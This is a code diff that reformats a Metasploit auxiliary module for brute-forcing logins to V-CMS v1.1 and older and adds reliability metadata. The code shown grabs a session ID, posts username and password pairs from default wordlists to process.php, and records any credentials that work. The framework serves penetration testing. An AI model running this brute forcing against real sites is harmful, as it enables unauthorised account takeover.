@@ -10,34 +10,48 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'V-CMS Login Utility',
-      'Description'    => %q{
-        This module attempts to authenticate to an English-based V-CMS login interface. It
-        should only work against version v1.1 or older, because these versions do not have
-        any default protections against brute forcing.
-      },
-      'Author'         => [ 'sinn3r' ],
-      'License'        => MSF_LICENSE
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'V-CMS Login Utility',
+        'Description' => %q{
+          This module attempts to authenticate to an English-based V-CMS login interface. It
+          should only work against version v1.1 or older, because these versions do not have
+          any default protections against brute forcing.
+        },
+        'Author' => [ 'sinn3r' ],
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
-        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt") ]),
-        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
-        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
+        OptPath.new('USERPASS_FILE', [
+          false, "File containing users and passwords separated by space, one pair per line",
+          File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt")
+        ]),
+        OptPath.new('USER_FILE', [
+          false, "File containing users, one per line",
+          File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt")
+        ]),
+        OptPath.new('PASS_FILE', [
+          false, "File containing passwords, one per line",
+          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")
+        ]),
         OptString.new('TARGETURI', [true, 'The URI path to V-CMS', '/vcms2/'])
-      ])
+      ]
+    )
   end
-
 
   def get_sid
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => @uri
+      'uri' => @uri
     })
 
     # Get the PHP session ID
@@ -83,12 +97,12 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       res = send_request_cgi({
-        'uri'    => "#{@uri}process.php",
+        'uri' => "#{@uri}process.php",
         'method' => 'POST',
         'cookie' => sid,
         'vars_post' => {
-          'user'     => user,
-          'pass'     => pass,
+          'user' => user,
+          'pass' => pass,
           'sublogin' => '1'
         }
       })
@@ -117,7 +131,7 @@ class MetasploitModule < Msf::Auxiliary
         vprint_status("Username found: #{user}")
       when /\<a href="process\.php\?logout=1"\>/
         print_good("Successful login: \"#{user}:#{pass}\"")
-        report_cred(ip: rhost, port: rport, user:user, password: pass, proof: res.body)
+        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
         return :next_user
       end
     end
